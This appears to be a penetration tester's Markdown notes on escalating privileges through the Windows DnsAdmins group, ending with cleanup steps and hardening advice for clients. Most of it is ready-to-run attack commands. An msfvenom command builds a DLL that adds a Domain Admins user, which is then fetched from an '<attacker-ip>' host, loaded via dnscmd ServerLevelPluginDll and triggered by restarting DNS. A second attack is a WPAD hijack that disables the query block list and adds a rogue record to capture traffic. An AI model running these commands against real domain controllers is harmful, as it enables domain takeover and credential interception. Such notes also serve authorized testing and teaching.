### DnsAdmins
#### Summary

Members of the `DnsAdmins` group have significant privileges over the DNS server configuration. On domain controllers (where DNS usually runs), these privileges can be abused to load arbitrary DLLs using the `ServerLevelPluginDll` registry key and escalate to SYSTEM. This is a dangerous and powerful method of privilege escalation and lateral movement.
#### Privileges

- Modify the DNS server plugin path using `dnscmd`
- Indirect privilege escalation via DLL loading by SYSTEM    
- Potential for WPAD-based MITM attacks
#### Conditions

- DNS service must be installed and running (typically on Domain Controllers)    
- User must be a member of the `DnsAdmins` group
- Ability to restart DNS service (directly or indirectly)
- DLL must be accessible by the system account (e.g., via a shared folder)
#### Enumeration

Check group membership:

```cmd
net localgroup DnsAdmins
```

Confirm a user is in DnsAdmins via PowerShell:

```powershell
Get-ADGroupMember -Identity DnsAdmins
```

Check current DLL config:

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters
```
#### Exploitation
##### DLL Injection via ServerLevelPluginDll

Generate a malicious DLL:

```bash
msfvenom -p windows/x64/exec CMD='net group "domain admins" netadm /add /domain' -f dll -o adduser.dll
```

Host the DLL:

```bash
python3 -m http.server 7777
```

Download on target:

```powershell
wget "http://<attacker-ip>:7777/adduser.dll" -OutFile "adduser.dll"
```

Load DLL as DnsAdmins member:

```cmd
dnscmd.exe /config /serverlevelplugindll C:\Users\netadm\Desktop\adduser.dll
```

Check/confirm permissions on DNS service:

```cmd
wmic useraccount where name="netadm" get sid
sc sdshow dns
```

Restart DNS to trigger payload:

```cmd
sc stop dns
sc start dns
```

Verify added user or reverse shell:

```cmd
net group "Domain Admins" /domain
```
#### Cleanup

Delete registry key:

```cmd
reg delete HKLM\SYSTEM\CurrentControlSet\Services\DNS\Parameters /v ServerLevelPluginDll
```

Restart DNS service:

```cmd
sc start dns
```

Verify:

```cmd
sc query dns
```
#### Alternative Exploit: WPAD Hijacking
##### Disable Global Query Block List:

```powershell
Set-DnsServerGlobalQueryBlockList -Enable $false -ComputerName dc01.inlanefreight.local
```
##### Add WPAD Record:

```powershell
Add-DnsServerResourceRecordA -Name wpad -ZoneName inlanefreight.local -ComputerName dc01.inlanefreight.local -IPv4Address 10.10.14.3
```
##### Relay/Capture Traffic with:

- `Responder`    
- `Inveigh`
- `Impacket smbrelayx`
#### Post-Exploitation

- Clear `ServerLevelPluginDll` key    
- Restore DNS service functionality
- Remove `wpad` record if created
- Provide client recommendations for:
    - Least privilege enforcement
    - DNS service hardening
    - Monitoring changes to DNS Parameters registry key        
# Tags
> #Windows-Post-Exploitation #Windows-Privesc #Privileged_Groups 